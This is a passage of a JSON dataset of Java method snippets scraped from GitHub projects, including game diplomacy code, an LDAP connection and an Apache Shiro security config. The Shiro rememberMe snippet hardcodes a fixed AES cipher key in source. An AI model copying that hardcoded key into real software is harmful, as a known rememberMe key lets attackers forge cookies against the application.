"onTransitionCancel", "class_name": "OnTransitionListener", "params": ["Transition"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onTransitionCancel(Transition transition) {\n\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/listener/OnTransitionListener.java", "stars": "2", "class_props": {"extends": null, "implements": ["Transition"], "modifiers": ["public"]}}, {"id": 58146, "method_name": "onTransitionPause", "class_name": "OnTransitionListener", "params": ["Transition"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onTransitionPause(Transition transition) {\n\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/listener/OnTransitionListener.java", "stars": "2", "class_props": {"extends": null, "implements": ["Transition"], "modifiers": ["public"]}}, {"id": 58147, "method_name": "onTransitionResume", "class_name": "OnTransitionListener", "params": ["Transition"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onTransitionResume(Transition transition) {\n\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/listener/OnTransitionListener.java", "stars": "2", "class_props": {"extends": null, "implements": ["Transition"], "modifiers": ["public"]}}, {"id": 58148, "method_name": "setDataType", "class_name": "TagBuilder", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setDataType(int dataType){\n        this.dataType = dataType;\n    }", "url": "https://raw.githubusercontent.com/ryandw11/ODS/master/src/main/java/me/ryandw11/ods/TagBuilder.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58149, "method_name": "getDataType", "class_name": "TagBuilder", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getDataType(){\n        return dataType;\n    }", "url": "https://raw.githubusercontent.com/ryandw11/ODS/master/src/main/java/me/ryandw11/ods/TagBuilder.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58150, "method_name": "setDataSize", "class_name": "TagBuilder", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setDataSize(int size){\n        this.dataSize = size;\n    }", "url": "https://raw.githubusercontent.com/ryandw11/ODS/master/src/main/java/me/ryandw11/ods/TagBuilder.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58151, "method_name": "getDataSize", "class_name": "TagBuilder", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getDataSize(){\n        return dataSize;\n    }", "url": "https://raw.githubusercontent.com/ryandw11/ODS/master/src/main/java/me/ryandw11/ods/TagBuilder.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58152, "method_name": "setStartingIndex", "class_name": "TagBuilder", "params": ["long"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setStartingIndex(long startingIndex){\n        this.startingIndex = startingIndex;\n    }", "url": "https://raw.githubusercontent.com/ryandw11/ODS/master/src/main/java/me/ryandw11/ods/TagBuilder.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58153, "method_name": "getStartingIndex", "class_name": "TagBuilder", "params": [], "throws": null, "modifiers": ["public"], "return_type": "long", "snippet": "    public long getStartingIndex(){\n        return startingIndex;\n    }", "url": "https://raw.githubusercontent.com/ryandw11/ODS/master/src/main/java/me/ryandw11/ods/TagBuilder.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58154, "method_name": "setName", "class_name": "TagBuilder", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setName(String s){\n       this.name = s;\n    }", "url": "https://raw.githubusercontent.com/ryandw11/ODS/master/src/main/java/me/ryandw11/ods/TagBuilder.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58155, "method_name": "getName", "class_name": "TagBuilder", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getName(){\n        return this.name;\n    }", "url": "https://raw.githubusercontent.com/ryandw11/ODS/master/src/main/java/me/ryandw11/ods/TagBuilder.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58156, "method_name": "setNameSize", "class_name": "TagBuilder", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setNameSize(int size){\n        this.nameSize = size;\n    }", "url": "https://raw.githubusercontent.com/ryandw11/ODS/master/src/main/java/me/ryandw11/ods/TagBuilder.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58157, "method_name": "getNameSize", "class_name": "TagBuilder", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getNameSize(){\n        return this.nameSize;\n    }", "url": "https://raw.githubusercontent.com/ryandw11/ODS/master/src/main/java/me/ryandw11/ods/TagBuilder.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58158, "method_name": "setValueBytes", "class_name": "TagBuilder", "params": ["byte"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setValueBytes(byte[] valueBytes){\n        this.valueBytes = valueBytes;\n    }", "url": "https://raw.githubusercontent.com/ryandw11/ODS/master/src/main/java/me/ryandw11/ods/TagBuilder.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58159, "method_name": "getValueBytes", "class_name": "TagBuilder", "params": [], "throws": null, "modifiers": ["public"], "return_type": "byte", "snippet": "    public byte[] getValueBytes(){\n        return this.valueBytes;\n    }", "url": "https://raw.githubusercontent.com/ryandw11/ODS/master/src/main/java/me/ryandw11/ods/TagBuilder.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58160, "method_name": "process", "class_name": "TagBuilder", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Tag<?>", "snippet": "    public Tag<?> process(){\n        switch (getDataType()){\n            case 1:\n                return new StringTag(this.name, null).createFromData(this.valueBytes);\n            case 2:\n                return new IntTag(this.name, -1).createFromData(this.valueBytes);\n            case 3:\n                return new FloatTag(this.name, -1).createFromData(this.valueBytes);\n            case 4:\n                return new DoubleTag(this.name, -1).createFromData(this.valueBytes);\n            case 5:\n                return new ShortTag(this.name, (short) -1).createFromData(this.valueBytes);\n            case 6:\n                return new LongTag(this.name, -1).createFromData(this.valueBytes);\n            case 7:\n                return new CharTag(this.name, ' ').createFromData(this.valueBytes);\n            case 8:\n                return new ByteTag(this.name, (byte) 0).createFromData(this.valueBytes);\n            case 9:\n                return new ListTag<>(this.name, null).createFromData(this.valueBytes);\n            case 10:\n                return new MapTag<>(this.name, null).createFromData(this.valueBytes);\n            case 11:\n                return new ObjectTag(this.name).createFromData(this.valueBytes);\n            default:\n                throw new RuntimeException(\"Error: That data type does not exist!\");\n        }\n    }", "url": "https://raw.githubusercontent.com/ryandw11/ODS/master/src/main/java/me/ryandw11/ods/TagBuilder.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58161, "method_name": "diplomat", "class_name": "OfferPactMessage", "params": ["Empire"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void diplomat(Empire e)  {\n        super.diplomat(e);\n    }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/diplomacy/OfferPactMessage.java", "stars": "74", "class_props": {"extends": "TurnNotificationMessage", "implements": null, "modifiers": ["public"]}}, {"id": 58162, "method_name": "numReplies", "class_name": "OfferPactMessage", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int numReplies()       \t\t{ return 2; }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/diplomacy/OfferPactMessage.java", "stars": "74", "class_props": {"extends": "TurnNotificationMessage", "implements": null, "modifiers": ["public"]}}, {"id": 58163, "method_name": "enabled", "class_name": "OfferPactMessage", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean enabled(int i)       { return true; }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/diplomacy/OfferPactMessage.java", "stars": "74", "class_props": {"extends": "TurnNotificationMessage", "implements": null, "modifiers": ["public"]}}, {"id": 58164, "method_name": "reply", "class_name": "OfferPactMessage", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String reply(int i)          { \n        switch (i) {\n            case 0 : return text(\"DIPLOMACY_ACCEPT_FORM_PACT\");\n            case 1 : return text(\"DIPLOMACY_DECLINE_OFFER\");\n        }\n        return \"\"; \n    }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/diplomacy/OfferPactMessage.java", "stars": "74", "class_props": {"extends": "TurnNotificationMessage", "implements": null, "modifiers": ["public"]}}, {"id": 58165, "method_name": "select", "class_name": "OfferPactMessage", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void select(int i) {\n        log(\"OfferPactMessage - selected: \", str(i));\n        switch(i) {\n        case 0: \n            DiplomaticReply reply = player().diplomatAI().acceptOfferPact(diplomat());\n            reply.resumeTurn(true);\n            DiplomaticMessage.reply(DiplomacyRequestReply.create(diplomat(), reply));\t\n            break;\n        case 1: \n        default:\n            escape(); break;\n        }\n    }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/diplomacy/OfferPactMessage.java", "stars": "74", "class_props": {"extends": "TurnNotificationMessage", "implements": null, "modifiers": ["public"]}}, {"id": 58166, "method_name": "escape", "class_name": "OfferPactMessage", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void escape() {\n        player().diplomatAI().refuseOfferPact(diplomat());\n        session().resumeNextTurnProcessing();\n    }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/diplomacy/OfferPactMessage.java", "stars": "74", "class_props": {"extends": "TurnNotificationMessage", "implements": null, "modifiers": ["public"]}}, {"id": 58167, "method_name": "decode", "class_name": "OfferPactMessage", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String decode(String encodedMessage) { \n        String s1 = super.decode(encodedMessage); \n        return s1;\n    }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/diplomacy/OfferPactMessage.java", "stars": "74", "class_props": {"extends": "TurnNotificationMessage", "implements": null, "modifiers": ["public"]}}, {"id": 58168, "method_name": "reconnect", "class_name": "LdapConnection", "params": ["String", "String"], "throws": ["NamingException"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void reconnect(String principle, String credentials) throws NamingException {\n        if(null == context){\n            env.put(Context.SECURITY_PRINCIPAL, principle);\n            env.put(Context.SECURITY_CREDENTIALS, credentials);\n            this.context = new InitialLdapContext(env, null);\n        }else{\n            this.context.addToEnvironment(Context.SECURITY_PRINCIPAL, principle);\n            this.context.addToEnvironment(Context.SECURITY_CREDENTIALS, credentials);\n            this.context.reconnect(null);\n        }\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/webank/wedatasphere/exchangis/datax/common/ldap/LdapConnection.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58169, "method_name": "getContext", "class_name": "LdapConnection", "params": [], "throws": null, "modifiers": ["public"], "return_type": "LdapContext", "snippet": "    public LdapContext getContext() {\n        return context;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/webank/wedatasphere/exchangis/datax/common/ldap/LdapConnection.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58170, "method_name": "setContext", "class_name": "LdapConnection", "params": ["LdapContext"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setContext(LdapContext context) {\n        this.context = context;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/webank/wedatasphere/exchangis/datax/common/ldap/LdapConnection.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58171, "method_name": "distZip", "class_name": "Download", "params": ["OutputStream"], "throws": ["IOException", "FileNotFoundException"], "modifiers": ["public", "static"], "return_type": "void", "snippet": "  public static void distZip(OutputStream outputStream) throws IOException, FileNotFoundException\n  {\n    File warFile = warFile();\n    try (ZipOutputStream zipOutputStream = new ZipOutputStream(outputStream))\n    {\n      ZipEntry warEntry = new ZipEntry(warFile.getName());\n      warEntry.setTime(warFile.lastModified());\n      zipOutputStream.putNextEntry(warEntry);\n      try (InputStream warStream = new FileInputStream(warFile))\n      {\n        copy(warStream, zipOutputStream);\n      }\n\n      try (ZipInputStream warStream = new ZipInputStream(new FileInputStream(warFile)))\n      {\n        for (ZipEntry entry; (entry = warStream.getNextEntry()) != null; )\n          if (entry.getName().startsWith(\"LICENSE/\"))\n          {\n            zipOutputStream.putNextEntry(entry);\n            copy(warStream, zipOutputStream);\n          }\n      }\n\n      ZipEntry readmeEntry = new ZipEntry(\"README.txt\");\n      readmeEntry.setTime(warFile.lastModified());\n      zipOutputStream.putNextEntry(readmeEntry);\n      try (PrintStream readMe = new PrintStream(zipOutputStream))\n      {\n        Railroad.usage(readMe, warFile.getName());\n      }\n    }\n  }", "url": "https://raw.githubusercontent.com/GuntherRademacher/rr/master/src/main/java/de/bottlecaps/railroad/core/Download.java", "stars": "10", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58172, "method_name": "copy", "class_name": "Download", "params": ["InputStream", "OutputStream"], "throws": ["IOException"], "modifiers": ["public", "static"], "return_type": "void", "snippet": "  public static void copy(InputStream in, OutputStream out) throws IOException\n  {\n    byte[] buffer = new byte[0x8000];\n    for (int length; (length = in.read(buffer)) > 0;)\n      out.write(buffer, 0, length);\n  }", "url": "https://raw.githubusercontent.com/GuntherRademacher/rr/master/src/main/java/de/bottlecaps/railroad/core/Download.java", "stars": "10", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58173, "method_name": "warFile", "class_name": "Download", "params": [], "throws": null, "modifiers": ["public", "static"], "return_type": "File", "snippet": "  public static File warFile()\n  {\n    String catalinaBase = System.getProperty(\"catalina.base\", System.getProperty(\"catalina.home\"));\n    if (catalinaBase != null)\n    {\n      File file = null;\n      file = new File(\n          catalinaBase +\n          File.separator +\n          \"webapps\" +\n          File.separator +\n          WAR_FILENAME);\n      if (file.exists())\n        return file;\n    }\n\n    String javaCommand = System.getProperty(\"sun.java.command\");\n    if (javaCommand != null)\n    {\n      for (String arg : javaCommand.split(\" \"))\n      {\n        String[] path = arg.split(\"[\\\\\\\\/]\");\n        if (path[path.length - 1].equalsIgnoreCase(WAR_FILENAME))\n        {\n          File file = new File(arg);\n          if (file.exists())\n            return file;\n        }\n      }\n    }\n    return null;\n  }", "url": "https://raw.githubusercontent.com/GuntherRademacher/rr/master/src/main/java/de/bottlecaps/railroad/core/Download.java", "stars": "10", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58174, "method_name": "javaVersion", "class_name": "Download", "params": [], "throws": null, "modifiers": ["public", "static"], "return_type": "int", "snippet": "  public static int javaVersion()\n  {\n    try (InputStream classFile = Download.class.getClassLoader().getResourceAsStream(Download.class.getName().replace('.', '/') + \".class\"))\n    {\n      byte[] bytes = new byte[8];\n      classFile.read(bytes);\n      return bytes[7] - 44;\n    }\n    catch (IOException e)\n    {\n      throw new RuntimeException(e.getMessage(), e);\n    }\n  }", "url": "https://raw.githubusercontent.com/GuntherRademacher/rr/master/src/main/java/de/bottlecaps/railroad/core/Download.java", "stars": "10", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58175, "method_name": "getType", "class_name": "Constraint", "params": [], "throws": null, "modifiers": ["public"], "return_type": "ConstraintType", "snippet": "    public ConstraintType getType() {\n        return type;\n    }", "url": "https://raw.githubusercontent.com/mjtb49/LattiCG/master/src/randomreverser/reversal/constraint/Constraint.java", "stars": "14", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 58176, "method_name": "getSteps", "class_name": "Constraint", "params": [], "throws": null, "modifiers": ["public"], "return_type": "long", "snippet": "    public long getSteps() {\n        return steps;\n    }", "url": "https://raw.githubusercontent.com/mjtb49/LattiCG/master/src/randomreverser/reversal/constraint/Constraint.java", "stars": "14", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 58177, "method_name": "setSteps", "class_name": "Constraint", "params": ["long"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setSteps(long steps) {\n        this.steps = steps;\n    }", "url": "https://raw.githubusercontent.com/mjtb49/LattiCG/master/src/randomreverser/reversal/constraint/Constraint.java", "stars": "14", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 58178, "method_name": "check", "class_name": "Constraint", "params": ["ProgramInstance", "long", "O"], "throws": null, "modifiers": ["public", "abstract"], "return_type": "boolean", "snippet": "    public abstract boolean check(ProgramInstance program, long seed, O observation);\n\n    public abstract void readOperands(StringParser parser);\n\n    public abstract void writeOperands(StringBuilder output, boolean verbose);\n\n    @Override\n    public String toString() {\n        StringBuilder sb = new StringBuilder();\n        sb.append(type.getName()).append(\" \");\n        writeOperands(sb, true);\n        return sb.toString();\n    }", "url": "https://raw.githubusercontent.com/mjtb49/LattiCG/master/src/randomreverser/reversal/constraint/Constraint.java", "stars": "14", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 58179, "method_name": "readOperands", "class_name": "Constraint", "params": ["StringParser"], "throws": null, "modifiers": ["public", "abstract"], "return_type": "void", "snippet": "    public abstract void readOperands(StringParser parser);\n\n    public abstract void writeOperands(StringBuilder output, boolean verbose);\n\n    @Override\n    public String toString() {\n        StringBuilder sb = new StringBuilder();\n        sb.append(type.getName()).append(\" \");\n        writeOperands(sb, true);\n        return sb.toString();\n    }", "url": "https://raw.githubusercontent.com/mjtb49/LattiCG/master/src/randomreverser/reversal/constraint/Constraint.java", "stars": "14", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 58180, "method_name": "writeOperands", "class_name": "Constraint", "params": ["StringBuilder", "boolean"], "throws": null, "modifiers": ["public", "abstract"], "return_type": "void", "snippet": "    public abstract void writeOperands(StringBuilder output, boolean verbose);\n\n    @Override\n    public String toString() {\n        StringBuilder sb = new StringBuilder();\n        sb.append(type.getName()).append(\" \");\n        writeOperands(sb, true);\n        return sb.toString();\n    }", "url": "https://raw.githubusercontent.com/mjtb49/LattiCG/master/src/randomreverser/reversal/constraint/Constraint.java", "stars": "14", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 58181, "method_name": "toString", "class_name": "Constraint", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String toString() {\n        StringBuilder sb = new StringBuilder();\n        sb.append(type.getName()).append(\" \");\n        writeOperands(sb, true);\n        return sb.toString();\n    }", "url": "https://raw.githubusercontent.com/mjtb49/LattiCG/master/src/randomreverser/reversal/constraint/Constraint.java", "stars": "14", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 58182, "method_name": "sessionManager", "class_name": "ShiroConfig", "params": [], "throws": null, "modifiers": ["public"], "return_type": "SessionManager", "snippet": "    public SessionManager sessionManager() {\n        DefaultWebSessionManager sessionManager = new DefaultWebSessionManager();\n        //\u8bbe\u7f6esession\u8fc7\u671f\u65f6\u95f4(\u5355\u4f4d\uff1a\u6beb\u79d2)\uff0c\u9ed8\u8ba4\u4e3a15\u5206\u949f\n        sessionManager.setGlobalSessionTimeout(1000 * 60 * 15);\n        sessionManager.setSessionValidationSchedulerEnabled(true);\n        sessionManager.setSessionIdUrlRewritingEnabled(false);\n\n        return sessionManager;\n    }", "url": "https://raw.githubusercontent.com/IzzyPrime/Admin/master/src/main/java/com/kalvin/kvf/common/shiro/ShiroConfig.java", "stars": "10", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58183, "method_name": "securityManager", "class_name": "ShiroConfig", "params": ["UserRealm", "SessionManager"], "throws": null, "modifiers": ["public"], "return_type": "SecurityManager", "snippet": "    public SecurityManager securityManager(UserRealm userRealm, SessionManager sessionManager) {\n        DefaultWebSecurityManager securityManager = new DefaultWebSecurityManager();\n        securityManager.setRealm(userRealm);\n        // \u81ea\u5b9a\u4e49\u7f13\u5b58\u5b9e\u73b0\n        securityManager.setCacheManager(ehCacheManager());\n        securityManager.setSessionManager(sessionManager);\n\n        // \u8bbe\u7f6ecookie\u7ba1\u7406\n        securityManager.setRememberMeManager(rememberMeManager());\n\n        return securityManager;\n    }", "url": "https://raw.githubusercontent.com/IzzyPrime/Admin/master/src/main/java/com/kalvin/kvf/common/shiro/ShiroConfig.java", "stars": "10", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58184, "method_name": "ehCacheManager", "class_name": "ShiroConfig", "params": [], "throws": null, "modifiers": ["public"], "return_type": "EhCacheManager", "snippet": "    public EhCacheManager ehCacheManager(){\n        EhCacheManager cacheManager = new EhCacheManager();\n        cacheManager.setCacheManagerConfigFile(\"classpath:ehcache.xml\");\n        return cacheManager;\n    }", "url": "https://raw.githubusercontent.com/IzzyPrime/Admin/master/src/main/java/com/kalvin/kvf/common/shiro/ShiroConfig.java", "stars": "10", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58185, "method_name": "rememberMeCookie", "class_name": "ShiroConfig", "params": [], "throws": null, "modifiers": ["private"], "return_type": "SimpleCookie", "snippet": "    private SimpleCookie rememberMeCookie() {\n        SimpleCookie simpleCookie = new SimpleCookie(\"rememberMe\");\n        // \u8bb0\u4f4f\u65f6\u95f4\uff0c\u5355\u4f4d\u79d2\uff0c\u9ed8\u8ba415\u5929\n        simpleCookie.setMaxAge(60 * 60 * 24 * 15);\n        return simpleCookie;\n    }", "url": "https://raw.githubusercontent.com/IzzyPrime/Admin/master/src/main/java/com/kalvin/kvf/common/shiro/ShiroConfig.java", "stars": "10", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58186, "method_name": "rememberMeManager", "class_name": "ShiroConfig", "params": [], "throws": null, "modifiers": ["private"], "return_type": "CookieRememberMeManager", "snippet": "    private CookieRememberMeManager rememberMeManager() {\n        CookieRememberMeManager cookieRememberMeManager = new CookieRememberMeManager();\n        cookieRememberMeManager.setCookie(rememberMeCookie());\n        // rememberMe cookie\u52a0\u5bc6\u7684\u5bc6\u94a5 \u5efa\u8bae\u6bcf\u4e2a\u9879\u76ee\u90fd\u4e0d\u4e00\u6837 \u9ed8\u8ba4AES\u7b97\u6cd5 \u5bc6\u94a5\u957f\u5ea6(128 256 512 \u4f4d)\n        cookieRememberMeManager.setCipherKey(Base64.decode(\"2AvVhdsgUs0FSA3SDFAdag==\"));\n        return cookieRememberMeManager;\n    }", "url": "https://raw.githubusercontent.com/IzzyPrime/Admin/master/src/main/java/com/kalvin/kvf/common/shiro/ShiroConfig.java", "stars": "10", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58187, "method_name": "shiroFilter", "class_name": "ShiroConfig", "params": ["SecurityManager"], "throws": null, "modifiers": ["public"], "return_type": "ShiroFilterFactoryBean", "snippet": "    public ShiroFilterFactoryBean shiroFilter(SecurityManager securityManager) {\n        ShiroFilterFactoryBean shiroFilter = new ShiroFilterFactoryBean();\n        shiroFilter.setSecurityManager(securityManager);\n\n        /*\u91cd\u8981\uff0c\u8bbe\u7f6e\u81ea\u5b9a\u4e49\u62e6\u622a\u5668\uff0c\u5f53\u8bbf\u95ee\u67d0\u4e9b\u81ea\u5b9a\u4e49url\u65f6\uff0c\u4f7f\u7528\u8fd9\u4e2afilter\u8fdb\u884c\u9a8c\u8bc1*/\n        Map<String, Filter> filters = new LinkedHashMap<>();\n        // \u5982\u679cmap\u91cc\u9762key\u503c\u4e3aauthc,\u8868\u793a\u6240\u6709\u540d\u4e3aauthc\u7684\u8fc7\u6ee4\u6761\u4ef6\u4f7f\u7528\u8fd9\u4e2a\u81ea\u5b9a\u4e49\u7684filter\n        // map\u91cc\u9762key\u503c\u4e3aLoginFilter,\u8868\u793a\u6240\u6709\u540d\u4e3aLoginFilter\u7684\u8fc7\u6ee4\u6761\u4ef6\u4f7f\u7528\u8fd9\u4e2a\u81ea\u5b9a\u4e49\u7684filter\uff0c\u5177\u4f53\u89c1\u4e0b\u65b9\n        filters.put(\"myFilter\", new LoginFilter());\n        shiroFilter.setFilters(filters);\n\n        shiroFilter.setLoginUrl(\"/login\");\n//        shiroFilter.setSuccessUrl(\"/sys/index\");\n        shiroFilter.setUnauthorizedUrl(\"/403\");\n\n        Map<String, String> filterMap = new LinkedHashMap<>();\n        filterMap.put(\"/static/**\", \"anon\");\n        filterMap.put(\"/login/**\", \"anon\");\n//        filterMap.put(\"/logout\", \"logout\");   // \u6682\u4e0d\u4f7f\u7528Shiro\u81ea\u5e26\u7684\u767b\u51fa\n        filterMap.put(\"/druid/**\", \"anon\");\n        filterMap.put(\"/captcha.jpg\", \"anon\");\n//        filterMap.put(\"/\", \"user\");\n\n        filterMap.put(\"/**\", \"myFilter,authc\");\n        shiroFilter.setFilterChainDefinitionMap(filterMap);\n\n        return shiroFilter;\n    }", "url": "https://raw.githubusercontent.com/IzzyPrime/Admin/master/src/main/java/com/kalvin/kvf/common/shiro/ShiroConfig.java", "stars": "10", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58188, "method_name": "lifecycleBeanPostProcessor", "class_name": "ShiroConfig", "params": [], "throws": null, "modifiers": ["public"], "return_type": "LifecycleBeanPostProcessor", "snippet": "    public LifecycleBeanPostProcessor lifecycleBeanPostProcessor() {\n        return new LifecycleBeanPostProcessor();\n    }", "url": "https://raw.githubusercontent.com/IzzyPrime/Admin/master/src/main/java/com/kalvin/kvf/common/shiro/ShiroConfig.java", "stars": "10", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58189, "method_name": "defaultAdvisorAutoProxyCreator", "class_name": "ShiroConfig", "params": [], "throws": null, "modifiers": ["public"], "return_type": "DefaultAdvisorAutoProxyCreator", "snippet": "    public DefaultAdvisorAutoProxyCreator defaultAdvisorAutoProxyCreator() {\n        DefaultAdvisorAutoProxyCreator proxyCreator = new DefaultAdvisorAutoProxyCreator();\n        proxyCreator.setProxyTargetClass(true);\n        return proxyCreator;\n    }", "url": "https://raw.githubusercontent.com/IzzyPrime/Admin/master/src/main/java/com/kalvin/kvf/common/shiro/ShiroConfig.java", "stars": "10", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58190, "method_name": "authorizationAttributeSourceAdvisor", "class_name": "ShiroConfig", "params": ["SecurityManager"], "throws": null, "modifiers": ["public"], "return_type": "AuthorizationAttributeSourceAdvisor", "snippet": "    public AuthorizationAttributeSourceAdvisor authorizationAttributeSourceAdvisor(SecurityManager securityManager) {\n        AuthorizationAttributeSourceAdvisor advisor = new AuthorizationAttributeSourceAdvisor();\n        advisor.setSecurityManager(securityManager);\n        return advisor;\n    }", "url": "https://raw.githubusercontent.com/IzzyPrime/Admin/master/src/main/java/com/kalvin/kvf/common/shiro/ShiroConfig.java", "stars": "10", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58191, "method_name": "shiroDialect", "class_name": "ShiroConfig", "params": [], "throws": null, "modifiers": ["public"], "return_type": "ShiroDialect", "snippet": "    public ShiroDialect shiroDialect() {\n        return new ShiroDialect();\n    }", "url": "https://raw.githubusercontent.com/IzzyPrime/Admin/master/src/main/java/com/kalvin/kvf/common/shiro/ShiroConfig.java", "stars": "10", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58192, "method_name": "onCreateViewHolder", "class_name": "IconHeaderItemPresenter", "params": ["ViewGroup"], "throws": null, "modifiers": ["public"], "return_type": "ViewHolder", "snippet": "    public ViewHolder onCreateViewHolder(ViewGroup viewGroup) {\n        mUnselectedAlpha = viewGroup.getResources()\n                .getFraction(R.fraction.lb_browse_header_unselect_alpha, 1, 1);\n        LayoutInflater inflater = (LayoutInflater) viewGroup.getContext()\n                .getSystemService(Context.LAYOUT_INFLATER_SERVICE);\n\n        View view = inflater.inflate(R.layout.icon_header_item, null);\n        view.setAlpha(mUnselectedAlpha); // Initialize icons to be at half-opacity.\n\n        return new ViewHolder(view);\n    }", "url": "https://raw.githubusercontent.com/idanapp/IdanPlusPlus/master/app/src/main/java/com/example/idan/plusplus/presenter/IconHeaderItemPresenter.java", "stars": "9", "class_props": {"extends": "RowHeaderPresenter", "implements": null, "modifiers": ["public"]}}, {"id": 58193, "method_name": "onBindViewHolder", "class_name": "IconHeaderItemPresenter", "params": ["Presenter", "Object"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onBindViewHolder(Presenter.ViewHolder viewHolder, Object item) {\n        HeaderItem headerItem = ((ListRow) item).getHeaderItem();\n        if (headerItem == null) return;\n        View rootView = viewHolder.view;\n        rootView.setFocusable(true);\n        ImageView iconView = rootView.findViewById(R.id.header_icon);\n        Drawable icon = rootView.getResources().getDrawable(R.drawable.tv_icon, null);\n        iconView.setImageDrawable(icon);\n        TextView label = (TextView) rootView.findViewById(R.id.header_label);\n        label.setTypeface(Typeface.DEFAULT_BOLD);\n        label.setTextColor(Color.WHITE);\n        